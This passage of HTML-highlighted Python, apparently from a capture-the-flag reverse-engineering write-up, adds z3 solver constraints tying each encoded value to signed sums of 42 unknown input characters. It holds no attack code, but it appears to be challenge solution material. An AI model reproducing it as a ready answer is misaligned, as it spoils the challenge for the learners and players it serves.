class="hljs-number">2</span>]) + c[<span class="hljs-number">3</span>] + c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) + c[<span class="hljs-number">6</span>] + c[<span class="hljs-number">7</span>] + c[<span class="hljs-number">8</span>] + c[</span><br><span class="line">    <span class="hljs-number">9</span>] + c[<span class="hljs-number">10</span>]) - c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) + c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) + c[<span class="hljs-number">0xf</span>] + c[<span class="hljs-number">0x10</span>] + c[<span class="hljs-number">0x11</span>] + c[<span class="hljs-number">0x12</span>]) - c[<span class="hljs-number">0x13</span>]) + c[<span class="hljs-number">0x14</span>] +</span><br><span class="line">                                       c[<span class="hljs-number">0x15</span>]) - c[<span class="hljs-number">0x16</span>]) - c[<span class="hljs-number">0x17</span>]) + c[<span class="hljs-number">0x18</span>] + c[<span class="hljs-number">0x19</span>] + c[<span class="hljs-number">0x1a</span>]) - c[<span class="hljs-number">0x1b</span>]) + c[</span><br><span class="line">                                      <span class="hljs-number">0x1c</span>]) - c[<span class="hljs-number">0x1d</span>]) - c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) - c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) + c[<span class="hljs-number">0x22</span>]) - c[</span><br><span class="line">                               <span class="hljs-number">0x23</span>]) - c[<span class="hljs-number">0x24</span>]) + c[<span class="hljs-number">0x25</span>]) - c[<span class="hljs-number">0x26</span>]) - c[<span class="hljs-number">0x27</span>]) + c[<span class="hljs-number">0x28</span>]) - c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">9</span>] == (((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] + c[<span class="hljs-number">1</span>] + c[<span class="hljs-number">2</span>]) - c[<span class="hljs-number">3</span>]) + c[<span class="hljs-number">4</span>] + c[<span class="hljs-number">5</span>] + c[<span class="hljs-number">6</span>]) - c[<span class="hljs-number">7</span>]) - c[<span class="hljs-number">8</span>]) - c[</span><br><span class="line">    <span class="hljs-number">9</span>]) - c[<span class="hljs-number">10</span>]) + c[<span class="hljs-number">0xb</span>] + c[<span class="hljs-number">0xc</span>] + c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) + c[<span class="hljs-number">0xf</span>] + c[<span class="hljs-number">0x10</span>]) - c[<span class="hljs-number">0x11</span>]) - c[<span class="hljs-number">0x12</span>]) + c[<span class="hljs-number">0x13</span>] + c[<span class="hljs-number">0x14</span>]) -</span><br><span class="line">                                     c[<span class="hljs-number">0x15</span>]) - c[<span class="hljs-number">0x16</span>]) - c[<span class="hljs-number">0x17</span>]) + c[<span class="hljs-number">0x18</span>]) - c[<span class="hljs-number">0x19</span>]) - c[<span class="hljs-number">0x1a</span>]) - c[<span class="hljs-number">0x1b</span>]) + c[</span><br><span class="line">                                  <span class="hljs-number">0x1c</span>] + c[<span class="hljs-number">0x1d</span>] + c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) + c[<span class="hljs-number">0x20</span>] + c[<span class="hljs-number">0x21</span>]) - c[<span class="hljs-number">0x22</span>]) - c[<span class="hljs-number">0x23</span>]) - c[</span><br><span class="line">                             <span class="hljs-number">0x24</span>]) - c[<span class="hljs-number">0x25</span>]) + c[<span class="hljs-number">0x26</span>]) - c[<span class="hljs-number">0x27</span>]) + c[<span class="hljs-number">0x28</span>] + c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">10</span>] == ((((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) + c[<span class="hljs-number">2</span>] + c[<span class="hljs-number">3</span>]) - c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) + c[<span class="hljs-number">6</span>] + c[<span class="hljs-number">7</span>]) - c[</span><br><span class="line">    <span class="hljs-number">8</span>]) - c[<span class="hljs-number">9</span>]) - c[<span class="hljs-number">10</span>]) - c[<span class="hljs-number">0xb</span>]) + c[<span class="hljs-number">0xc</span>] + c[<span class="hljs-number">0xd</span>] + c[<span class="hljs-number">0xe</span>]) - c[<span class="hljs-number">0xf</span>]) + c[<span class="hljs-number">0x10</span>]) - c[<span class="hljs-number">0x11</span>]) + c[<span class="hljs-number">0x12</span>] + c[<span class="hljs-number">0x13</span>] + c[</span><br><span class="line">                                             <span class="hljs-number">0x14</span>]) - c[<span class="hljs-number">0x15</span>]) + c[<span class="hljs-number">0x16</span>]) - c[<span class="hljs-number">0x17</span>]) - c[<span class="hljs-number">0x18</span>]) - c[<span class="hljs-number">0x19</span>]) + c[<span class="hljs-number">0x1a</span>]) -</span><br><span class="line">                                  c[<span class="hljs-number">0x1b</span>]) - c[<span class="hljs-number">0x1c</span>]) + c[<span class="hljs-number">0x1d</span>]) - c[<span class="hljs-number">0x1e</span>]) + c[<span class="hljs-number">0x1f</span>] + c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) - c[<span class="hljs-number">0x22</span>]) +</span><br><span class="line">                           c[<span class="hljs-number">0x23</span>]) - c[<span class="hljs-number">0x24</span>]) - c[<span class="hljs-number">0x25</span>]) + c[<span class="hljs-number">0x26</span>]) - c[<span class="hljs-number">0x27</span>]) + c[<span class="hljs-number">0x28</span>] + c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0xb</span>] == ((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) + c[<span class="hljs-number">2</span>] + c[<span class="hljs-number">3</span>] + c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) + c[<span class="hljs-number">6</span>] + c[<span class="hljs-number">7</span>]) - c[<span class="hljs-number">8</span>]) +</span><br><span class="line">                                                c[<span class="hljs-number">9</span>] + c[<span class="hljs-number">10</span>]) - c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) + c[<span class="hljs-number">0xf</span>]) - c[</span><br><span class="line">                                              <span class="hljs-number">0x10</span>]) - c[<span class="hljs-number">0x11</span>]) - c[<span class="hljs-number">0x12</span>]) + c[<span class="hljs-number">0x13</span>] + c[<span class="hljs-number">0x14</span>]) - c[<span class="hljs-number">0x15</span>]) + c[<span class="hljs-number">0x16</span>]) -</span><br><span class="line">                                    c[<span class="hljs-number">0x17</span>]) + c[<span class="hljs-number">0x18</span>] + c[<span class="hljs-number">0x19</span>] + c[<span class="hljs-number">0x1a</span>] + c[<span class="hljs-number">0x1b</span>]) - c[<span class="hljs-number">0x1c</span>]) + c[<span class="hljs-number">0x1d</span>] + c[<span class="hljs-number">0x1e</span>]) -</span><br><span class="line">                                c[<span class="hljs-number">0x1f</span>]) - c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) - c[<span class="hljs-number">0x22</span>]) - c[<span class="hljs-number">0x23</span>]) + c[<span class="hljs-number">0x24</span>] + c[<span class="hljs-number">0x25</span>]) - c[<span class="hljs-number">0x26</span>]) -</span><br><span class="line">                         c[<span class="hljs-number">0x27</span>]) - c[<span class="hljs-number">0x28</span>]) - c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0xc</span>] == (((((((((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) - c[<span class="hljs-number">2</span>]) - c[<span class="hljs-number">3</span>]) + c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) - c[<span class="hljs-number">6</span>]) + c[</span><br><span class="line">    <span class="hljs-number">7</span>] + c[<span class="hljs-number">8</span>]) - c[<span class="hljs-number">9</span>]) + c[<span class="hljs-number">10</span>]) - c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) + c[<span class="hljs-number">0xe</span>]) - c[<span class="hljs-number">0xf</span>]) + c[<span class="hljs-number">0x10</span>]) - c[<span class="hljs-number">0x11</span>]) + c[<span class="hljs-number">0x12</span>]) - c[</span><br><span class="line">                                               <span class="hljs-number">0x13</span>]) - c[<span class="hljs-number">0x14</span>]) - c[<span class="hljs-number">0x15</span>]) - c[<span class="hljs-number">0x16</span>]) + c[<span class="hljs-number">0x17</span>]) - c[<span class="hljs-number">0x18</span>]) + c[</span><br><span class="line">                                         <span class="hljs-number">0x19</span>]) - c[<span class="hljs-number">0x1a</span>]) + c[<span class="hljs-number">0x1b</span>]) - c[<span class="hljs-number">0x1c</span>]) + c[<span class="hljs-number">0x1d</span>]) - c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) + c[</span><br><span class="line">                                  <span class="hljs-number">0x20</span>] + c[<span class="hljs-number">0x21</span>] + c[<span class="hljs-number">0x22</span>]) - c[<span class="hljs-number">0x23</span>]) - c[<span class="hljs-number">0x24</span>]) - c[<span class="hljs-number">0x25</span>]) - c[<span class="hljs-number">0x26</span>]) + c[<span class="hljs-number">0x27</span>]) - c[</span><br><span class="line">                            <span class="hljs-number">0x28</span>]) - c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0xd</span>] == (((((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) + c[<span class="hljs-number">2</span>]) - c[<span class="hljs-number">3</span>]) + c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) + c[<span class="hljs-number">6</span>]) - c[<span class="hljs-number">7</span>]) +</span><br><span class="line">                                                 c[<span class="hljs-number">8</span>]) - c[<span class="hljs-number">9</span>]) + c[<span class="hljs-number">10</span>]) - c[<span class="hljs-number">0xb</span>]) + c[<span class="hljs-number">0xc</span>] + c[<span class="hljs-number">0xd</span>] + c[<span class="hljs-number">0xe</span>] + c[<span class="hljs-number">0xf</span>]) -</span><br><span class="line">                                            c[<span class="hljs-number">0x10</span>]) - c[<span class="hljs-number">0x11</span>]) - c[<span class="hljs-number">0x12</span>]) + c[<span class="hljs-number">0x13</span>] + c[<span class="hljs-number">0x14</span>] + c[<span class="hljs-number">0x15</span>]) - c[<span class="hljs-number">0x16</span>]) -</span><br><span class="line">                                       c[<span class="hljs-number">0x17</span>]) + c[<span class="hljs-number">0x18</span>] + c[<span class="hljs-number">0x19</span>]) - c[<span class="hljs-number">0x1a</span>]) - c[<span class="hljs-number">0x1b</span>]) + c[<span class="hljs-number">0x1c</span>] + c[<span class="hljs-number">0x1d</span>]) - c[</span><br><span class="line">                                      <span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) - c[<span class="hljs-number">0x20</span>]) + c[<span class="hljs-number">0x21</span>]) - c[<span class="hljs-number">0x22</span>]) - c[<span class="hljs-number">0x23</span>]) + c[<span class="hljs-number">0x24</span>]) - c[</span><br><span class="line">                               <span class="hljs-number">0x25</span>]) - c[<span class="hljs-number">0x26</span>]) - c[<span class="hljs-number">0x27</span>]) + c[<span class="hljs-number">0x28</span>]) - c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0xe</span>] == (((((((((((((((((((((((((c[<span class="hljs-number">0</span>] + c[<span class="hljs-number">1</span>] + c[<span class="hljs-number">2</span>]) - c[<span class="hljs-number">3</span>]) - c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) + c[<span class="hljs-number">6</span>]) - c[<span class="hljs-number">7</span>]) + c[<span class="hljs-number">8</span>] + c[</span><br><span class="line">    <span class="hljs-number">9</span>] + c[<span class="hljs-number">10</span>]) - c[<span class="hljs-number">0xb</span>]) + c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) + c[<span class="hljs-number">0xf</span>] + c[<span class="hljs-number">0x10</span>] + c[<span class="hljs-number">0x11</span>]) - c[<span class="hljs-number">0x12</span>]) - c[<span class="hljs-number">0x13</span>]) - c[<span class="hljs-number">0x14</span>]) -</span><br><span class="line">                                 c[<span class="hljs-number">0x15</span>]) + c[<span class="hljs-number">0x16</span>] + c[<span class="hljs-number">0x17</span>] + c[<span class="hljs-number">0x18</span>]) - c[<span class="hljs-number">0x19</span>]) + c[<span class="hljs-number">0x1a</span>] + c[<span class="hljs-number">0x1b</span>] + c[<span class="hljs-number">0x1c</span>]) - c[</span><br><span class="line">                                 <span class="hljs-number">0x1d</span>]) - c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) + c[<span class="hljs-number">0x20</span>] + c[<span class="hljs-number">0x21</span>] + c[<span class="hljs-number">0x22</span>] + c[<span class="hljs-number">0x23</span>] + c[<span class="hljs-number">0x24</span>] + c[</span><br><span class="line">                              <span class="hljs-number">0x25</span>] + c[<span class="hljs-number">0x26</span>]) - c[<span class="hljs-number">0x27</span>]) - c[<span class="hljs-number">0x28</span>]) - c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0xf</span>] == ((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) + c[<span class="hljs-number">2</span>] + c[<span class="hljs-number">3</span>] + c[<span class="hljs-number">4</span>] + c[<span class="hljs-number">5</span>]) - c[<span class="hljs-number">6</span>]) + c[<span class="hljs-number">7</span>]) - c[<span class="hljs-number">8</span>]) - c[</span><br><span class="line">    <span class="hljs-number">9</span>]) - c[<span class="hljs-number">10</span>]) + c[<span class="hljs-number">0xb</span>] + c[<span class="hljs-number">0xc</span>] + c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) - c[<span class="hljs-number">0xf</span>]) - c[<span class="hljs-number">0x10</span>]) + c[<span class="hljs-number">0x11</span>]) - c[<span class="hljs-number">0x12</span>]) - c[<span class="hljs-number">0x13</span>]) - c[</span><br><span class="line">                                       <span class="hljs-number">0x14</span>]) - c[<span class="hljs-number">0x15</span>]) + c[<span class="hljs-number">0x16</span>] + c[<span class="hljs-number">0x17</span>] + c[<span class="hljs-number">0x18</span>] + c[<span class="hljs-number">0x19</span>] + c[<span class="hljs-number">0x1a</span>] + c[<span class="hljs-number">0x1b</span>]) -</span><br><span class="line">                                c[<span class="hljs-number">0x1c</span>]) - c[<span class="hljs-number">0x1d</span>]) - c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) + c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) + c[<span class="hljs-number">0x22</span>] + c[<span class="hljs-number">0x23</span>] + c[</span><br><span class="line">                              <span class="hljs-number">0x24</span>] + c[<span class="hljs-number">0x25</span>]) - c[<span class="hljs-number">0x26</span>]) + c[<span class="hljs-number">0x27</span>] + c[<span class="hljs-number">0x28</span>]) - c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x10</span>] == ((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) + c[<span class="hljs-number">2</span>] + c[<span class="hljs-number">3</span>]) - c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) + c[<span class="hljs-number">6</span>] + c[<span class="hljs-number">7</span>] + c[<span class="hljs-number">8</span>] +</span><br><span class="line">                                                  c[<span class="hljs-number">9</span>] + c[<span class="hljs-number">10</span>]) - c[<span class="hljs-number">0xb</span>]) + c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) + c[<span class="hljs-number">0xe</span>] + c[<span class="hljs-number">0xf</span>] + c[</span><br><span class="line">                                                  <span class="hljs-number">0x10</span>]) - c[<span class="hljs-number">0x11</span>]) + c[<span class="hljs-number">0x12</span>]) - c[<span class="hljs-number">0x13</span>]) + c[<span class="hljs-number">0x14</span>]) - c[<span class="hljs-number">0x15</span>]) - c[</span><br><span class="line">                                            <span class="hljs-number">0x16</span>]) - c[<span class="hljs-number">0x17</span>]) - c[<span class="hljs-number">0x18</span>]) - c[<span class="hljs-number">0x19</span>]) + c[<span class="hljs-number">0x1a</span>] + c[<span class="hljs-number">0x1b</span>] + c[<span class="hljs-number">0x1c</span>] + c[</span><br><span class="line">                                        <span class="hljs-number">0x1d</span>]) - c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) + c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) - c[<span class="hljs-number">0x22</span>]) + c[<span class="hljs-number">0x23</span>]) - c[</span><br><span class="line">                                 <span class="hljs-number">0x24</span>]) + c[<span class="hljs-number">0x25</span>]) - c[<span class="hljs-number">0x26</span>]) + c[<span class="hljs-number">0x27</span>]) - c[<span class="hljs-number">0x28</span>]) + c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x11</span>] == ((((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] + c[<span class="hljs-number">1</span>] + c[<span class="hljs-number">2</span>] + c[<span class="hljs-number">3</span>] + c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) + c[<span class="hljs-number">6</span>] + c[<span class="hljs-number">7</span>] + c[</span><br><span class="line">    <span class="hljs-number">8</span>]) - c[<span class="hljs-number">9</span>]) - c[<span class="hljs-number">10</span>]) + c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) + c[<span class="hljs-number">0xd</span>] + c[<span class="hljs-number">0xe</span>] + c[<span class="hljs-number">0xf</span>]) - c[<span class="hljs-number">0x10</span>]) + c[<span class="hljs-number">0x11</span>]) - c[<span class="hljs-number">0x12</span>]) - c[<span class="hljs-number">0x13</span>]) +</span><br><span class="line">                                            c[<span class="hljs-number">0x14</span>]) - c[<span class="hljs-number">0x15</span>]) + c[<span class="hljs-number">0x16</span>]) - c[<span class="hljs-number">0x17</span>]) - c[<span class="hljs-number">0x18</span>]) + c[<span class="hljs-number">0x19</span>]) - c[<span class="hljs-number">0x1a</span>]) +</span><br><span class="line">                                     c[<span class="hljs-number">0x1b</span>]) - c[<span class="hljs-number">0x1c</span>]) + c[<span class="hljs-number">0x1d</span>]) - c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) + c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) - c[</span><br><span class="line">                                  <span class="hljs-number">0x22</span>]) + c[<span class="hljs-number">0x23</span>]) - c[<span class="hljs-number">0x24</span>]) + c[<span class="hljs-number">0x25</span>]) - c[<span class="hljs-number">0x26</span>]) + c[<span class="hljs-number">0x27</span>] + c[<span class="hljs-number">0x28</span>]) - c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x12</span>] == ((((((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) - c[<span class="hljs-number">2</span>]) - c[<span class="hljs-number">3</span>]) + c[<span class="hljs-number">4</span>] + c[<span class="hljs-number">5</span>]) - c[<span class="hljs-number">6</span>]) + c[<span class="hljs-number">7</span>]) -</span><br><span class="line">                                                    c[<span class="hljs-number">8</span>]) + c[<span class="hljs-number">9</span>] + c[<span class="hljs-number">10</span>]) - c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) + c[<span class="hljs-number">0xe</span>]) - c[</span><br><span class="line">                                                  <span class="hljs-number">0xf</span>]) - c[<span class="hljs-number">0x10</span>]) + c[<span class="hljs-number">0x11</span>] + c[<span class="hljs-number">0x12</span>] + c[<span class="hljs-number">0x13</span>]) - c[<span class="hljs-number">0x14</span>]) - c[</span><br><span class="line">                                              <span class="hljs-number">0x15</span>]) - c[<span class="hljs-number">0x16</span>]) - c[<span class="hljs-number">0x17</span>]) - c[<span class="hljs-number">0x18</span>]) - c[<span class="hljs-number">0x19</span>]) - c[<span class="hljs-number">0x1a</span>]) - c[<span class="hljs-number">0x1b</span>]) +</span><br><span class="line">                                   c[<span class="hljs-number">0x1c</span>] + c[<span class="hljs-number">0x1d</span>] + c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) - c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) + c[<span class="hljs-number">0x22</span>]) - c[<span class="hljs-number">0x23</span>]) -</span><br><span class="line">                             c[<span class="hljs-number">0x24</span>]) - c[<span class="hljs-number">0x25</span>]) - c[<span class="hljs-number">0x26</span>]) - c[<span class="hljs-number">0x27</span>]) - c[<span class="hljs-number">0x28</span>]) + c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x13</span>] == ((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] + c[<span class="hljs-number">1</span>] + c[<span class="hljs-number">2</span>] + c[<span class="hljs-number">3</span>]) - c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) + c[<span class="hljs-number">6</span>]) - c[<span class="hljs-number">7</span>]) - c[<span class="hljs-number">8</span>]) -</span><br><span class="line">                                            c[<span class="hljs-number">9</span>]) - c[<span class="hljs-number">10</span>]) - c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) + c[<span class="hljs-number">0xe</span>] + c[<span class="hljs-number">0xf</span>] + c[<span class="hljs-number">0x10</span>]) -</span><br><span class="line">                                      c[<span class="hljs-number">0x11</span>]) + c[<span class="hljs-number">0x12</span>] + c[<span class="hljs-number">0x13</span>] + c[<span class="hljs-number">0x14</span>] + c[<span class="hljs-number">0x15</span>]) - c[<span class="hljs-number">0x16</span>]) + c[<span class="hljs-number">0x17</span>] + c[</span><br><span class="line">                                       <span class="hljs-number">0x18</span>]) - c[<span class="hljs-number">0x19</span>]) + c[<span class="hljs-number">0x1a</span>] + c[<span class="hljs-number">0x1b</span>]) - c[<span class="hljs-number">0x1c</span>]) + c[<span class="hljs-number">0x1d</span>] + c[<span class="hljs-number">0x1e</span>] + c[<span class="hljs-number">0x1f</span>] +</span><br><span class="line">                               c[<span class="hljs-number">0x20</span>] + c[<span class="hljs-number">0x21</span>]) - c[<span class="hljs-number">0x22</span>]) + c[<span class="hljs-number">0x23</span>]) - c[<span class="hljs-number">0x24</span>]) - c[<span class="hljs-number">0x25</span>]) - c[<span class="hljs-number">0x26</span>]) + c[<span class="hljs-number">0x27</span>] + c[</span><br><span class="line">                             <span class="hljs-number">0x28</span>]) - c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x14</span>] == ((((((((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] + c[<span class="hljs-number">1</span>]) - c[<span class="hljs-number">2</span>]) - c[<span class="hljs-number">3</span>]) - c[<span class="hljs-number">4</span>]) + c[<span class="hljs-number">5</span>]) - c[<span class="hljs-number">6</span>]) + c[</span><br><span class="line">    <span class="hljs-number">7</span>]) - c[<span class="hljs-number">8</span>]) - c[<span class="hljs-number">9</span>]) + c[<span class="hljs-number">10</span>] + c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) + c[<span class="hljs-number">0xe</span>]) - c[<span class="hljs-number">0xf</span>]) - c[<span class="hljs-number">0x10</span>]) + c[<span class="hljs-number">0x11</span>]) - c[<span class="hljs-number">0x12</span>]) - c[</span><br><span class="line">                                               <span class="hljs-number">0x13</span>]) + c[<span class="hljs-number">0x14</span>] + c[<span class="hljs-number">0x15</span>]) - c[<span class="hljs-number">0x16</span>]) + c[<span class="hljs-number">0x17</span>] + c[<span class="hljs-number">0x18</span>]) - c[<span class="hljs-number">0x19</span>]) -</span><br><span class="line">                                      c[<span class="hljs-number">0x1a</span>]) - c[<span class="hljs-number">0x1b</span>]) - c[<span class="hljs-number">0x1c</span>]) - c[<span class="hljs-number">0x1d</span>]) - c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) - c[<span class="hljs-number">0x20</span>]) + c[</span><br><span class="line">                                   <span class="hljs-number">0x21</span>]) - c[<span class="hljs-number">0x22</span>]) + c[<span class="hljs-number">0x23</span>] + c[<span class="hljs-number">0x24</span>]) - c[<span class="hljs-number">0x25</span>]) + c[<span class="hljs-number">0x26</span>]) - c[<span class="hljs-number">0x27</span>]) + c[<span class="hljs-number">0x28</span>]) -</span><br><span class="line">           c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x15</span>] == (((((((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) - c[<span class="hljs-number">2</span>]) - c[<span class="hljs-number">3</span>]) + c[<span class="hljs-number">4</span>] + c[<span class="hljs-number">5</span>] + c[<span class="hljs-number">6</span>] + c[<span class="hljs-number">7</span>]) -</span><br><span class="line">                                                       c[<span class="hljs-number">8</span>]) - c[<span class="hljs-number">9</span>]) - c[<span class="hljs-number">10</span>]) - c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) -</span><br><span class="line">                                                c[<span class="hljs-number">0xf</span>]) - c[<span class="hljs-number">0x10</span>]) + c[<span class="hljs-number">0x11</span>]) - c[<span class="hljs-number">0x12</span>]) - c[<span class="hljs-number">0x13</span>]) + c[<span class="hljs-number">0x14</span>]) - c[</span><br><span class="line">                                              <span class="hljs-number">0x15</span>]) + c[<span class="hljs-number">0x16</span>] + c[<span class="hljs-number">0x17</span>] + c[<span class="hljs-number">0x18</span>]) - c[<span class="hljs-number">0x19</span>]) - c[<span class="hljs-number">0x1a</span>]) + c[<span class="hljs-number">0x1b</span>]) -</span><br><span class="line">                                     c[<span class="hljs-number">0x1c</span>]) - c[<span class="hljs-number">0x1d</span>]) - c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) - c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) - c[<span class="hljs-number">0x22</span>]) - c[</span><br><span class="line">                                  <span class="hljs-number">0x23</span>]) - c[<span class="hljs-number">0x24</span>]) + c[<span class="hljs-number">0x25</span>]) - c[<span class="hljs-number">0x26</span>]) - c[<span class="hljs-number">0x27</span>]) - c[<span class="hljs-number">0x28</span>]) + c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x16</span>] == (((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] + c[<span class="hljs-number">1</span>] + c[<span class="hljs-number">2</span>] + c[<span class="hljs-number">3</span>] + c[<span class="hljs-number">4</span>] + c[<span class="hljs-number">5</span>] + c[<span class="hljs-number">6</span>] + c[<span class="hljs-number">7</span>]) - c[<span class="hljs-number">8</span>]) + c[</span><br><span class="line">    <span class="hljs-number">9</span>]) - c[<span class="hljs-number">10</span>]) + c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) + c[<span class="hljs-number">0xd</span>] + c[<span class="hljs-number">0xe</span>] + c[<span class="hljs-number">0xf</span>]) - c[<span class="hljs-number">0x10</span>]) + c[<span class="hljs-number">0x11</span>] + c[<span class="hljs-number">0x12</span>]) - c[<span class="hljs-number">0x13</span>]) - c[<span class="hljs-number">0x14</span>]) +</span><br><span class="line">                                        c[<span class="hljs-number">0x15</span>] + c[<span class="hljs-number">0x16</span>]) - c[<span class="hljs-number">0x17</span>]) + c[<span class="hljs-number">0x18</span>]) - c[<span class="hljs-number">0x19</span>]) - c[<span class="hljs-number">0x1a</span>]) + c[<span class="hljs-number">0x1b</span>]) - c[</span><br><span class="line">                                      <span class="hljs-number">0x1c</span>]) + c[<span class="hljs-number">0x1d</span>] + c[<span class="hljs-number">0x1e</span>] + c[<span class="hljs-number">0x1f</span>]) - c[<span class="hljs-number">0x20</span>]) + c[<span class="hljs-number">0x21</span>]) - c[<span class="hljs-number">0x22</span>]) - c[</span><br><span class="line">                                 <span class="hljs-number">0x23</span>]) - c[<span class="hljs-number">0x24</span>]) - c[<span class="hljs-number">0x25</span>]) + c[<span class="hljs-number">0x26</span>]) - c[<span class="hljs-number">0x27</span>]) + c[<span class="hljs-number">0x28</span>] + c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">0x17</span>] == (((((((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) + c[<span class="hljs-number">2</span>] + c[<span class="hljs-number">3</span>]) - c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) - c[<span class="hljs-number">6</span>]) - c[<span class="hljs-number">7</span>]) +</span><br><span class="line">                                                     c[<span class="hljs-number">8</span>]) - c[<span class="hljs-number">9</span>]) - c[<span class="hljs-number">10</span>]) + c[<span class="hljs-number">0xb</span>] + c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) + c[</span><br><span class="line">                                                   <span class="hljs-number">0xf</span>]) - c[<span class="hljs-number">0x10</span>]) - c[<span class="hljs-number">0x11</span>]) + c[<span class="hljs-number">0x12</span>] + c[<span class="hljs-number">0x13</span>]) - c[<span class="hljs-number">0x14</span>]) - 